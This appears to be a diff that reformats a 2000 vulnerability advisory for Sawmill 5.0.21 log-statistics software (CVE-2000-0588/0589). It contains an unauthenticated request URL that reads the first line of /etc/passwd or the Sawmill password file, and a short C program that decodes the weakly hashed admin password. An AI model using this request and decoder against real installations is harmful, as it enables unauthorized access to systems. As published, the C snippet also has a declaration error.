@@ -1,69 +1,76 @@
-                                Advisory #: 37
-Title: Local file injection & weak password encryption flowerfire sawmill
-v5.0.21
-Author:Larry W. Cashdollar, @_larry0
-Date: 2000-06-27
-Download Site: http://www.flowerfire.com/sawmill
-Vendor:FlowerFire
-Vendor Notified: 2000-06-27
-Vendor Contact: https://www.sawmill.net/
-Description: SawMill is a site log statistics package for UNIX, Windows and
-MacOS.
-Vulnerability:
-In my test configuration I have sawmill listening on port 8987 of my webserver.
-I noticed two things. Dangerous 1) You can get sawmill to read you the first
-line of any (if run as nobody) world readable files without needing to
-authenticate first. The following will print the first line of /etc/passwd:
-http://192.168.1.65:8987/sawmill?rfcf+%22/etc/
-passwd%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3 You can imagine how much more fun
-this would be if it was launched as root. Which it should not and does not need
-to be. More Danger 2) The password is stored with a weak hash algorithm and can
-be decrypted using the attached C program. This is dangerous because the
-previous security hole will allow you to read the first line of the sawmill/
-SawmillInfo/SawmillPassword decrypt the password and access the site
-statistics, reconfigure sawmill. Along with the ability to browse the remote
-machines drive contents. If this is being run as root then the attacker can
-specify root readonly files as log files and read most if not all of their
-contents. file info: sawmill5.0.21trial_x86_linux.tar.gz I have notified the
-vendor and they were very responsive and are currently working on a fix
-CVE-2000-0588 2000-0589
-JSON:Export
-Exploit Code:
-   1. /*Dehash password for Sawmill admin account.
-   2.  
-   3. Larry W. Cashdollar
-   4. lwc@vapid.dhs.org
-   5. http://vapid.dhs.org
-   6. usage ./decrypt cyphertext
-   7.  
-   8. */
-   9.  
-  10. #include <stdio.h>
-  11.  
-  12. char alpha ="abcdefghijklmnopqrstuvwxyz0123456789!@$%^&()_+~<>?:\"{}|";
-      char *encode="=GeKMNQS~TfUVWXY[abcygimrs\"$&-]FLq4.@wICH2!oEn}Z%(Ovt{z";
-  13.  
-  14. int
-  15. main (int argc, char **argv)
-  16. {
-  17.  
-  18. int x, y;
-  19. char cypher[128];
-  20.  
-  21. strncpy (cypher, argv[1], 128);
-  22.  
-  23. for (x = 0; x < strlen (cypher); x++) {
-  24.  
-  25.       for (y = 0; y < strlen (encode); y++)
-  26.         if (cypher[x] == encode[y]){
-  27.           printf ("%c", alpha[y]);
-  28.           break;
-  29.           }
-  30. }
-  31.  
-  32. printf("\n\"+\" could also be a space [ ]\n");
-  33. }
-  34.  
-  35.  
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/sawmill-advisory.txt
+
+                               Advisory #: 37
+
+   Title: Local file injection & weak password encryption flowerfire
+   sawmill v5.0.21
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2000-06-27
+   Download Site: http://www.flowerfire.com/sawmill
+   Vendor: FlowerFire
+   Vendor Notified: 2000-06-27
+   Vendor Contact: https://www.sawmill.net/
+   Description: SawMill is a site log statistics package for UNIX, Windows
+   and MacOS.
+   Vulnerability:
+   In my test configuration I have sawmill listening on port 8987 of my
+   webserver. I noticed two things. Dangerous 1) You can get sawmill to
+   read you the first line of any (if run as nobody) world readable files
+   without needing to authenticate first. The following will print the
+   first line of /etc/passwd:
+   http://192.168.1.65:8987/sawmill?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1
+   ,1,1,1,1,1,1,1+3 You can imagine how much more fun this would be if it
+   was launched as root. Which it should not and does not need to be. More
+   Danger 2) The password is stored with a weak hash algorithm and can be
+   decrypted using the attached C program. This is dangerous because the
+   previous security hole will allow you to read the first line of the
+   sawmill/SawmillInfo/SawmillPassword decrypt the password and access the
+   site statistics, reconfigure sawmill. Along with the ability to browse
+   the remote machines drive contents. If this is being run as root then
+   the attacker can specify root readonly files as log files and read most
+   if not all of their contents. file info:
+   sawmill5.0.21trial_x86_linux.tar.gz I have notified the vendor and they
+   were very responsive and are currently working on a fix
+   CVE-2000-0588 2000-0589
+   JSON: Export
+   Exploit Code:
+
+    1. /*Dehash password for Sawmill admin account.
+    2.
+    3. Larry W. Cashdollar
+    4. lwc@vapid.dhs.org
+    5. http://vapid.dhs.org
+    6. usage ./decrypt cyphertext
+    7.
+    8. */
+    9.
+   10. #include <stdio.h>
+   11.
+   12. char alpha
+       ="abcdefghijklmnopqrstuvwxyz0123456789!@$%^&()_+~<>?:\"{}|"; char
+       *encode="=GeKMNQS~TfUVWXY[abcygimrs\"$&-]FLq4.@wICH2!oEn}Z%(Ovt{z";
+   13.
+   14. int
+   15. main (int argc, char **argv)
+   16. {
+   17.
+   18. int x, y;
+   19. char cypher[128];
+   20.
+   21. strncpy (cypher, argv[1], 128);
+   22.
+   23. for (x = 0; x < strlen (cypher); x++) {
+   24.
+   25. for (y = 0; y < strlen (encode); y++)
+   26. if (cypher[x] == encode[y]){
+   27. printf ("%c", alpha[y]);
+   28. break;
+   29. }
+   30. }
+   31.
+   32. printf("\n\"+\" could also be a space [ ]\n");
+   33. }
+   34.
+   35.
+
+   Screen Shots:
+   Advisory: http://www.vapid.dhs.org/advisories/sawmill-advisory.txt
